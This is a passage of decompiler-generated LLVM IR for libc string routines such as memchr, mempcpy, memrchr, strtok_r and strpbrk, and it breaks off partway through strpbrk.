  uselistorder i32 %v0_8051dd5, { 1, 0 }
  uselistorder i32 %v1_8051d25, { 1, 2, 0 }
  uselistorder i32 %v0_8051d23, { 1, 0 }
  uselistorder i32 %v0_8051da0, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_8051cf6, { 1, 0 }
  uselistorder i32 %v9_8051ced, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8051ce5, { 1, 0 }
  uselistorder i32 %v0_8051cb7, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8051c90, { 1, 0 }
  uselistorder i32 %v1_8051c90, { 1, 0, 2 }
  uselistorder i32 %v2_8051c8e, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8051bc4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8051baa, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8051c0f, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_8051b75, { 0, 2, 1 }
  uselistorder i32 %v1_8051b4e, { 1, 0 }
  uselistorder i32 %v0_8051b49, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8051b16, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8051b11, { 1, 0 }
  uselistorder i8 %v2_8051b0a, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8051b0a, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8051a94, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_8051a79, { 1, 0 }
  uselistorder i32 %v1_8051a65, { 1, 0 }
  uselistorder i32 %v0_8051a59, { 1, 0 }
  uselistorder i32 %v4_8051a40, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8051a45, { 1, 0 }
  uselistorder i32 %v2_8051a03, { 1, 0, 2 }
  uselistorder i3 %v1_80518b9, { 1, 0 }
  uselistorder i8 %v4_8051938, { 1, 0 }
  uselistorder i32 %v3_8051877, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_8051877, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_8051849, { 1, 0 }
  uselistorder i32 %v3_8051837, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 23, 10, 11, 24, 13, 14, 12, 18, 15, 16, 17, 19, 20, 21, 22 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 6, 7, 3, 8, 10, 4, 9, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 160, { 1, 0, 2 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 43, { 1, 0 }
  uselistorder i8 16, { 1, 2, 3, 0 }
  uselistorder i32 176, { 1, 2, 0 }
  uselistorder i32 112, { 3, 4, 5, 1, 2, 0 }
  uselistorder i8 48, { 10, 12, 2, 3, 4, 7, 6, 5, 8, 0, 9, 1, 11 }
  uselistorder i8 -53, { 1, 0 }
  uselistorder i32* @esp, { 76, 0, 1, 268, 2, 3, 4, 9, 77, 78, 79, 80, 10, 81, 82, 83, 84, 85, 12, 86, 87, 88, 14, 89, 15, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 13, 102, 16, 103, 104, 105, 17, 106, 107, 108, 109, 110, 111, 112, 113, 11, 114, 154, 18, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 128, 8, 125, 126, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 203, 5, 193, 194, 195, 196, 197, 19, 198, 199, 200, 201, 202, 204, 205, 206, 207, 219, 6, 208, 209, 210, 211, 212, 213, 20, 214, 215, 216, 217, 218, 220, 221, 222, 223, 21, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 22, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 7, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 259, 260, 261, 262, 263, 264, 265, 266, 267 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 7, 23, 21, 18, 22, 8, 9, 10, 11, 12, 13, 19, 0, 1, 2, 3, 4, 14, 5, 6, 15, 16, 17, 20 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 48, { 0, 6, 3, 2, 1, 8, 4, 5, 9, 10, 11, 12, 7 }
  uselistorder i32 9, { 7, 8, 2, 6, 4, 9, 10, 11, 12, 13, 3, 5, 0, 14, 1 }
  uselistorder i32 -65536, { 0, 4, 1, 2, 3 }
  uselistorder i32 68, { 0, 2, 3, 4, 1 }
  uselistorder i8 32, { 11, 0, 1, 16, 2, 12, 13, 7, 14, 3, 4, 8, 15, 5, 6, 9, 10 }
  uselistorder i32 6, { 12, 13, 3, 11, 8, 9, 5, 18, 10, 14, 15, 1, 0, 2, 4, 7, 16, 6, 17 }
  uselistorder i32 32, { 54, 28, 79, 32, 52, 55, 56, 68, 29, 1, 0, 2, 3, 46, 4, 53, 5, 6, 7, 8, 9, 10, 57, 58, 30, 59, 60, 61, 62, 63, 64, 65, 11, 66, 67, 47, 77, 78, 76, 69, 70, 13, 12, 38, 15, 14, 37, 17, 16, 39, 71, 35, 18, 48, 49, 19, 50, 31, 21, 20, 40, 36, 33, 41, 22, 23, 25, 24, 42, 44, 27, 26, 43, 72, 73, 74, 75, 45, 34, 51 }
  uselistorder label %dec_label_pc_8051da2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051da0, { 1, 0 }
  uselistorder label %dec_label_pc_8051d1f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051cd1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ca9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051c78, { 1, 0 }
  uselistorder label %dec_label_pc_8051c65, { 1, 0 }
  uselistorder label %dec_label_pc_8051c4b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051c18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051c03, { 1, 0 }
  uselistorder label %dec_label_pc_8051bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8051b7f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051b71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051b37, { 1, 0 }
  uselistorder label %dec_label_pc_8051b07.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8051ad3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051aa2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051a8d, { 1, 0 }
  uselistorder label %dec_label_pc_8051944, { 1, 0 }
  uselistorder label %dec_label_pc_8051868, { 1, 0 }
  uselistorder label %dec_label_pc_805185f, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ddc = load i32, i32* @edi, align 4
  store i32 %v0_8051ddc, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8051de3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051de3, i32* %edi.global-to-local, align 4
  %v1_8051deb = icmp eq i32 %arg3, 0
  store i1 %v1_8051deb, i1* %zf.global-to-local, align 1
  br i1 %v1_8051deb, label %dec_label_pc_8051dfb, label %dec_label_pc_8051def

dec_label_pc_8051def:                             ; preds = %entry
  %v2_8051def = call i32 @_strlen(i8* %arg1)
  %v3_8051def = mul i32 %v2_8051def, -1
  %v4_8051def = add i32 %v3_8051def, -2
  store i32 %v4_8051def, i32* @ecx, align 4
  %v0_8051df1 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8051df1, label %dec_label_pc_8051def.dec_label_pc_8051df8_crit_edge, label %dec_label_pc_8051df3

dec_label_pc_8051def.dec_label_pc_8051df8_crit_edge: ; preds = %dec_label_pc_8051def
  %v0_8051df8.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8051df8.pre, -1
  br label %dec_label_pc_8051df8

dec_label_pc_8051df3:                             ; preds = %dec_label_pc_8051def
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051df8

dec_label_pc_8051df8:                             ; preds = %dec_label_pc_8051def.dec_label_pc_8051df8_crit_edge, %dec_label_pc_8051df3
  %v0_8051df8 = phi i32 [ %phitmp, %dec_label_pc_8051def.dec_label_pc_8051df8_crit_edge ], [ 0, %dec_label_pc_8051df3 ]
  %v8_8051df8 = icmp eq i32 %v0_8051df8, 0
  store i1 %v8_8051df8, i1* %zf.global-to-local, align 1
  store i32 %v0_8051df8, i32* %edi.global-to-local, align 4
  %v2_8051dfd.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051dfb

dec_label_pc_8051dfb:                             ; preds = %entry, %dec_label_pc_8051df8
  %v2_8051dfd = phi i32 [ %v0_8051ddc, %entry ], [ %v2_8051dfd.pre, %dec_label_pc_8051df8 ]
  %v0_8051dfb = phi i32 [ 0, %entry ], [ %v0_8051df8, %dec_label_pc_8051df8 ]
  store i32 %v2_8051dfd, i32* @edi, align 4
  ret i32 %v0_8051dfb

; uselistorder directives
  uselistorder i32 %v0_8051df8, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8051dfb, { 1, 0 }
  uselistorder label %dec_label_pc_8051df8, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8051e00 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8051e13 = inttoptr i32 %arg1 to i16*
  %v4_8051e13 = call i32 @memcpy(i16* %v3_8051e13, i32 %arg2, i32 %arg3)
  %v0_8051e18 = load i32, i32* @esi, align 4
  %v2_8051e18 = add i32 %v0_8051e18, %arg3
  store i32 %v0_8051e00, i32* @esi, align 4
  ret i32 %v2_8051e18

; uselistorder directives
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 5, 0, 1, 8, 6, 9, 2, 3, 4, 7 }
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8051e29 = urem i32 %arg2, 256
  %v4_8051e35 = sext i8 %arg1 to i32
  %v2_8051e39 = add i32 %v4_8051e35, %arg3
  %v1_8051e4b7 = icmp eq i32 %arg3, 0
  br i1 %v1_8051e4b7, label %dec_label_pc_8051e53, label %dec_label_pc_8051e4f

dec_label_pc_8051e3d:                             ; preds = %dec_label_pc_8051e4f
  %v1_8051e3d = add i32 %v0_8051e3d, -1
  %v5_8051e3e = load i32, i32* @edx, align 4
  %v6_8051e3e = and i32 %v5_8051e3e, -256
  %v7_8051e3e = or i32 %v6_8051e3e, %v4_8051e29
  store i32 %v7_8051e3e, i32* @edx, align 4
  %v1_8051e42 = inttoptr i32 %v1_8051e3d to i8*
  %v2_8051e42 = load i8, i8* %v1_8051e42, align 1
  %v15_8051e42 = icmp eq i8 %v2_8051e42, %tmp
  br i1 %v15_8051e42, label %dec_label_pc_8051ed0, label %dec_label_pc_8051e4a

dec_label_pc_8051e4a:                             ; preds = %dec_label_pc_8051e3d
  %v1_8051e4a = add i32 %v0_8051e4a, -1
  %v8_8051e4a = icmp eq i32 %v1_8051e4a, 0
  br i1 %v8_8051e4a, label %dec_label_pc_8051e53, label %dec_label_pc_8051e4f

dec_label_pc_8051e4f:                             ; preds = %entry, %dec_label_pc_8051e4a
  %v0_8051e4a = phi i32 [ %v1_8051e4a, %dec_label_pc_8051e4a ], [ %arg3, %entry ]
  %v0_8051e3d = phi i32 [ %v1_8051e3d, %dec_label_pc_8051e4a ], [ %v2_8051e39, %entry ]
  %v2_8051e4f = urem i32 %v0_8051e3d, 4
  %v3_8051e4f = icmp eq i32 %v2_8051e4f, 0
  %v1_8051e51 = icmp eq i1 %v3_8051e4f, false
  br i1 %v1_8051e51, label %dec_label_pc_8051e3d, label %dec_label_pc_8051e53

dec_label_pc_8051e53:                             ; preds = %dec_label_pc_8051e4a, %dec_label_pc_8051e4f, %entry
  %v0_8051eb6.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8051e4a ], [ %v0_8051e4a, %dec_label_pc_8051e4f ]
  %v0_8051e58 = phi i32 [ %v2_8051e39, %entry ], [ %v1_8051e3d, %dec_label_pc_8051e4a ], [ %v0_8051e3d, %dec_label_pc_8051e4f ]
  store i32 %v0_8051e58, i32* @ecx, align 4
  %v2_8051e5c = mul nuw nsw i32 %v4_8051e29, 256
  %v2_8051e5f = or i32 %v2_8051e5c, %v4_8051e29
  %v2_8051e63 = mul i32 %v2_8051e5f, 65536
  %v2_8051e66 = or i32 %v2_8051e63, %v2_8051e5f
  %v6_8051eb950 = icmp ugt i32 %v0_8051eb6.pr, 3
  br i1 %v6_8051eb950, label %dec_label_pc_8051e6a, label %dec_label_pc_8051ebb

dec_label_pc_8051e6a:                             ; preds = %dec_label_pc_8051e53, %dec_label_pc_8051eb3
  %v0_8051eb352 = phi i32 [ %v1_8051eb3, %dec_label_pc_8051eb3 ], [ %v0_8051eb6.pr, %dec_label_pc_8051e53 ]
  %v0_8051e6a51 = phi i32 [ %v1_8051e6a, %dec_label_pc_8051eb3 ], [ %v0_8051e58, %dec_label_pc_8051e53 ]
  %v1_8051e6a = add i32 %v0_8051e6a51, -4
  store i32 %v1_8051e6a, i32* @ecx, align 4
  %v2_8051e6f = inttoptr i32 %v1_8051e6a to i32*
  %v3_8051e6f = load i32, i32* %v2_8051e6f, align 4
  %v4_8051e6f = xor i32 %v3_8051e6f, %v2_8051e66
  %v1_8051e71 = add i32 %v4_8051e6f, 2130640639
  %v1_8051e77 = sub i32 -1, %v4_8051e6f
  %v2_8051e79 = xor i32 %v1_8051e71, %v1_8051e77
  %v1_8051e7b = and i32 %v2_8051e79, -2130640640
  %v2_8051e7b = icmp eq i32 %v1_8051e7b, 0
  br i1 %v2_8051e7b, label %dec_label_pc_8051eb3, label %dec_label_pc_8051e83

dec_label_pc_8051e83:                             ; preds = %dec_label_pc_8051e6a
  %v7_8051e83 = or i32 %v1_8051e7b, %v4_8051e29
  %v1_8051e87 = add i32 %v0_8051e6a51, -1
  %v2_8051e8a = inttoptr i32 %v1_8051e87 to i8*
  %v3_8051e8a = load i8, i8* %v2_8051e8a, align 1
  %v16_8051e8a = icmp eq i8 %v3_8051e8a, %tmp
  br i1 %v16_8051e8a, label %dec_label_pc_8051ed0, label %dec_label_pc_8051e8f

dec_label_pc_8051e8f:                             ; preds = %dec_label_pc_8051e83
  %v1_8051e93 = add i32 %v0_8051e6a51, -2
  %v2_8051e96 = inttoptr i32 %v1_8051e93 to i8*
  %v3_8051e96 = load i8, i8* %v2_8051e96, align 1
  %v16_8051e96 = icmp eq i8 %v3_8051e96, %tmp
  br i1 %v16_8051e96, label %dec_label_pc_8051ed0, label %dec_label_pc_8051e9b

dec_label_pc_8051e9b:                             ; preds = %dec_label_pc_8051e8f
  %v1_8051e9f = add i32 %v0_8051e6a51, -3
  %v2_8051ea2 = inttoptr i32 %v1_8051e9f to i8*
  %v3_8051ea2 = load i8, i8* %v2_8051ea2, align 1
  %v16_8051ea2 = icmp eq i8 %v3_8051ea2, %tmp
  br i1 %v16_8051ea2, label %dec_label_pc_8051ed0, label %dec_label_pc_8051ea7

dec_label_pc_8051ea7:                             ; preds = %dec_label_pc_8051e9b
  %v1_8051eab = inttoptr i32 %v1_8051e6a to i8*
  %v2_8051eab = load i8, i8* %v1_8051eab, align 1
  %v15_8051eab = icmp eq i8 %v2_8051eab, %tmp
  %v1_8051ead = icmp eq i1 %v15_8051eab, false
  br i1 %v1_8051ead, label %dec_label_pc_8051eb3, label %dec_label_pc_8051eaf

dec_label_pc_8051eaf:                             ; preds = %dec_label_pc_8051ea7
  br label %dec_label_pc_8051ed0

dec_label_pc_8051eb3:                             ; preds = %dec_label_pc_8051ea7, %dec_label_pc_8051e6a
  %v5_8051ec027 = phi i32 [ %v7_8051e83, %dec_label_pc_8051ea7 ], [ 0, %dec_label_pc_8051e6a ]
  %v1_8051eb3 = add i32 %v0_8051eb352, -4
  %v6_8051eb9 = icmp ugt i32 %v1_8051eb3, 3
  br i1 %v6_8051eb9, label %dec_label_pc_8051e6a, label %dec_label_pc_8051ebb

dec_label_pc_8051ebb:                             ; preds = %dec_label_pc_8051eb3, %dec_label_pc_8051e53
  %v5_8051ec026.lcssa = phi i32 [ %v4_8051e29, %dec_label_pc_8051e53 ], [ %v5_8051ec027, %dec_label_pc_8051eb3 ]
  %v0_8051e6a.lcssa = phi i32 [ %v0_8051e58, %dec_label_pc_8051e53 ], [ %v1_8051e6a, %dec_label_pc_8051eb3 ]
  %v0_8051eb3.lcssa = phi i32 [ %v0_8051eb6.pr, %dec_label_pc_8051e53 ], [ %v1_8051eb3, %dec_label_pc_8051eb3 ]
  br label %dec_label_pc_8051ec8

dec_label_pc_8051ebf:                             ; preds = %dec_label_pc_8051ec8
  %v1_8051ec8 = add i32 %v0_8051ec8, -1
  %v1_8051ebf = add i32 %v0_8051ebf, -1
  %v6_8051ec0 = and i32 %v5_8051ec0, -256
  %v7_8051ec0 = or i32 %v6_8051ec0, %v4_8051e29
  %v1_8051ec4 = inttoptr i32 %v1_8051ebf to i8*
  %v2_8051ec4 = load i8, i8* %v1_8051ec4, align 1
  %v15_8051ec4 = icmp eq i8 %v2_8051ec4, %tmp
  br i1 %v15_8051ec4, label %dec_label_pc_8051ed0, label %dec_label_pc_8051ec8

dec_label_pc_8051ec8:                             ; preds = %dec_label_pc_8051ebf, %dec_label_pc_8051ebb
  %v5_8051ec0 = phi i32 [ %v7_8051ec0, %dec_label_pc_8051ebf ], [ %v5_8051ec026.lcssa, %dec_label_pc_8051ebb ]
  %v0_8051ebf = phi i32 [ %v1_8051ebf, %dec_label_pc_8051ebf ], [ %v0_8051e6a.lcssa, %dec_label_pc_8051ebb ]
  %v0_8051ec8 = phi i32 [ %v1_8051ec8, %dec_label_pc_8051ebf ], [ %v0_8051eb3.lcssa, %dec_label_pc_8051ebb ]
  %v10_8051ec9 = icmp eq i32 %v0_8051ec8, 0
  %v1_8051ecc = icmp eq i1 %v10_8051ec9, false
  br i1 %v1_8051ecc, label %dec_label_pc_8051ebf, label %dec_label_pc_8051ece

dec_label_pc_8051ece:                             ; preds = %dec_label_pc_8051ec8
  br label %dec_label_pc_8051ed0

dec_label_pc_8051ed0:                             ; preds = %dec_label_pc_8051e3d, %dec_label_pc_8051e9b, %dec_label_pc_8051e8f, %dec_label_pc_8051e83, %dec_label_pc_8051ebf, %dec_label_pc_8051eaf, %dec_label_pc_8051ece
  %v0_8051ed3 = phi i32 [ %v1_8051e6a, %dec_label_pc_8051eaf ], [ 0, %dec_label_pc_8051ece ], [ %v1_8051ebf, %dec_label_pc_8051ebf ], [ %v1_8051e9f, %dec_label_pc_8051e9b ], [ %v1_8051e93, %dec_label_pc_8051e8f ], [ %v1_8051e87, %dec_label_pc_8051e83 ], [ %v1_8051e3d, %dec_label_pc_8051e3d ]
  ret i32 %v0_8051ed3

; uselistorder directives
  uselistorder i32 %v0_8051ec8, { 1, 0 }
  uselistorder i32 %v1_8051eb3, { 0, 2, 1 }
  uselistorder i32 %v1_8051e6a, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8051e6a51, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8051e5f, { 1, 0 }
  uselistorder i32 %v0_8051e3d, { 1, 0, 2 }
  uselistorder i32 %v2_8051e39, { 1, 0 }
  uselistorder i32 %v4_8051e29, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -3, { 1, 4, 2, 0, 3 }
  uselistorder i32 -2, { 2, 7, 14, 15, 1, 17, 18, 19, 3, 5, 4, 0, 8, 9, 10, 16, 11, 12, 6, 13 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051ed0, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8051e6a, { 1, 0 }
  uselistorder label %dec_label_pc_8051e53, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051e4f, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051ed4 = load i32, i32* @edi, align 4
  %v0_8051ed5 = load i32, i32* @esi, align 4
  %v0_8051ed6 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ed6, i32* %stack_var_-12, align 4
  %v4_8051ed7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051ed7, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051ee3 = icmp eq i8* %arg1, null
  %v1_8051ee5 = icmp eq i1 %v1_8051ee3, false
  br i1 %v1_8051ee5, label %dec_label_pc_8051ee9, label %dec_label_pc_8051ee7

dec_label_pc_8051ee7:                             ; preds = %entry
  %v1_8051ee7 = inttoptr i32 %arg3 to i32*
  %v2_8051ee7 = load i32, i32* %v1_8051ee7, align 4
  store i32 %v2_8051ee7, i32* @ebx, align 4
  br label %dec_label_pc_8051ee9

dec_label_pc_8051ee9:                             ; preds = %entry, %dec_label_pc_8051ee7
  %v0_8051eec = phi i32 [ %v4_8051ed7, %entry ], [ %v2_8051ee7, %dec_label_pc_8051ee7 ]
  %v0_8051ee9 = load i32, i32* @ecx, align 4
  %v5_8051eec = inttoptr i32 %v0_8051eec to i8*
  %v8_8051eed = call i32 @__GI_strspn(i8* %v5_8051eec, i32 %arg2, i32 %v0_8051ee9, i32 %v0_8051ee9)
  store i32 %v8_8051eed, i32* %eax.global-to-local, align 4
  %v0_8051ef5 = load i32, i32* @ebx, align 4
  %v2_8051ef5 = add i32 %v0_8051ef5, %v8_8051eed
  store i32 %v2_8051ef5, i32* @ebx, align 4
  %v1_8051ef7 = inttoptr i32 %v2_8051ef5 to i8*
  %v2_8051ef7 = load i8, i8* %v1_8051ef7, align 1
  %v3_8051ef7 = icmp eq i8 %v2_8051ef7, 0
  %v1_8051efa = icmp eq i1 %v3_8051ef7, false
  br i1 %v1_8051efa, label %dec_label_pc_8051f02, label %dec_label_pc_8051efc

dec_label_pc_8051efc:                             ; preds = %dec_label_pc_8051ee9
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051efe = load i32, i32* @esi, align 4
  %v2_8051efe = inttoptr i32 %v1_8051efe to i32*
  store i32 %v2_8051ef5, i32* %v2_8051efe, align 4
  %v0_8051f2c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f29

dec_label_pc_8051f02:                             ; preds = %dec_label_pc_8051ee9
  %v0_8051f02 = load i32, i32* @edx, align 4
  %v0_8051f04 = load i32, i32* @edi, align 4
  %v8_8051f06 = call i32 @__GI_strpbrk(i8* %v1_8051ef7, i32 %v0_8051f04, i32 %v0_8051f02, i32 %v0_8051f02)
  store i32 %v8_8051f06, i32* %eax.global-to-local, align 4
  %v2_8051f0e = icmp eq i32 %v8_8051f06, 0
  %v1_8051f10 = icmp eq i1 %v2_8051f0e, false
  br i1 %v1_8051f10, label %dec_label_pc_8051f21, label %dec_label_pc_8051f12

dec_label_pc_8051f12:                             ; preds = %dec_label_pc_8051f02
  %v0_8051f16 = load i32, i32* @ebx, align 4
  %v5_8051f16 = inttoptr i32 %v0_8051f16 to i8*
  %v8_8051f17 = call i32 @rawmemchr(i8* %v5_8051f16, i32 0, i32 %v8_8051f06, i32 %v8_8051f06)
  br label %dec_label_pc_8051f25

dec_label_pc_8051f21:                             ; preds = %dec_label_pc_8051f02
  %v9_8051f06 = inttoptr i32 %v8_8051f06 to i8*
  store i8 0, i8* %v9_8051f06, align 1
  %v2_8051f24 = add i32 %v8_8051f06, 1
  br label %dec_label_pc_8051f25

dec_label_pc_8051f25:                             ; preds = %dec_label_pc_8051f12, %dec_label_pc_8051f21
  %storemerge = phi i32 [ %v2_8051f24, %dec_label_pc_8051f21 ], [ %v8_8051f17, %dec_label_pc_8051f12 ]
  %v0_8051f25 = phi i32 [ %v2_8051f24, %dec_label_pc_8051f21 ], [ %v8_8051f17, %dec_label_pc_8051f12 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8051f25 = load i32, i32* @esi, align 4
  %v2_8051f25 = inttoptr i32 %v1_8051f25 to i32*
  store i32 %v0_8051f25, i32* %v2_8051f25, align 4
  %v0_8051f27 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f27, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f29

dec_label_pc_8051f29:                             ; preds = %dec_label_pc_8051efc, %dec_label_pc_8051f25
  %v0_8051f2c = phi i32 [ %v0_8051f2c.pre, %dec_label_pc_8051efc ], [ %v0_8051f27, %dec_label_pc_8051f25 ]
  %v2_8051f29 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051f29, i32* @ebx, align 4
  store i32 %v0_8051ed5, i32* @esi, align 4
  store i32 %v0_8051ed4, i32* @edi, align 4
  ret i32 %v0_8051f2c

; uselistorder directives
  uselistorder i32 %v8_8051f06, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 3, 4, 5, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f29, { 1, 0 }
  uselistorder label %dec_label_pc_8051f25, { 1, 0 }
  uselistorder label %dec_label_pc_8051ee9, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8051f31 = load i32, i32* @ebx, align 4
  %v2_8051f4824 = load i8, i8* %arg1, align 1
  %v4_8051f4a28 = icmp eq i8 %v2_8051f4824, 0
  br i1 %v4_8051f4a28, label %dec_label_pc_8051f52, label %dec_label_pc_8051f4e.lr.ph

dec_label_pc_8051f4e.lr.ph:                       ; preds = %entry
  %v3_8051f4825 = zext i8 %v2_8051f4824 to i32
  %v5_8051f4826 = and i32 %v0_8051f31, -256
  %v6_8051f4827 = or i32 %v3_8051f4825, %v5_8051f4826
  %v4_8051f36 = ptrtoint i8* %arg1 to i32
  %v1_8051f4113 = inttoptr i32 %arg2 to i8*
  %v4_8051f41.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051f4e

dec_label_pc_8051f3c:                             ; preds = %dec_label_pc_8051f4e, %dec_label_pc_8051f40
  %v6_8051f4122 = phi i32 [ %v6_8051f41, %dec_label_pc_8051f40 ], [ %v6_8051f4117, %dec_label_pc_8051f4e ]
  %v2_8051f4121 = phi i8 [ %v2_8051f41, %dec_label_pc_8051f40 ], [ %v2_8051f4114, %dec_label_pc_8051f4e ]
  %v0_8051f4020 = phi i32 [ %v1_8051f40, %dec_label_pc_8051f40 ], [ %arg2, %dec_label_pc_8051f4e ]
  %v15_8051f3c = icmp eq i8 %v2_8051f4121, %v2_8051f4831
  br i1 %v15_8051f3c, label %dec_label_pc_8051f54, label %dec_label_pc_8051f40

dec_label_pc_8051f40:                             ; preds = %dec_label_pc_8051f3c
  %v1_8051f40 = add i32 %v0_8051f4020, 1
